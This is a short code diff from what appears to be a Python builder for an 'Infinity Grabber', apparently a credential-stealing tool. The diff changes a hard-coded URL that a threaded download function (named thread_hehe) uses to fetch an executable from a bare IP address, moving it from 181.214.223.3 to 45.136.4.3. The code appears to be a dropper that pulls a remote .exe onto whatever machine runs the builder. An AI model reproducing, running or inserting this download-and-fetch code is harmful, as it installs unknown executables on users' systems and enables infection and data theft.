@@ -46,8 +46,8 @@ def thread_hehe(url, filename):
     thread.start()
     thread.join()
 # Class for building the Infinity Grabber
-url = 'http://181.214.223.3/infinity.exe'
-filename = 'infinity.exe' 
+url = 'http://45.136.4.3/Infinity.exe'
+filename = 'Infinity.exe' 
 class Build:
     def __init__(self) -> None:
         # Initialize various attributes used in the build process
